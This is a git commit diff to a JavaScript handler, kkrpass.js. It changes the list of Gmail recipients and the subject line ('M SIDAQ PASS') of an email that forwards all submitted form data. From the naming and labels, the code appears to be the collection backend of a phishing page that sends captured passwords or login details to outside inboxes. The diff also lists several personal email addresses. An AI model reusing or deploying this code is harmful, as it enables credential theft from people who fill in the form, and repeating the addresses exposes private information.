58bb04f6baf3836d3899e3a4d817031db9ed1d4b
svgdvahshn-gif <svgdvahshn@gmail.com>
2026-01-23 23:01:29 +0500

    Update kkrpass.js

--- kkrpass.js
+++ kkrpass.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
     // ✅ Send email
     await transporter.sendMail({
       from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
-      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,rahmtullahnizamani1@gmail.com",
-      subject: "RAHAMTULAH PASS",
+      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,jessicalive573@gmail.com",
+      subject: "M SIDAQ PASS",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
     });
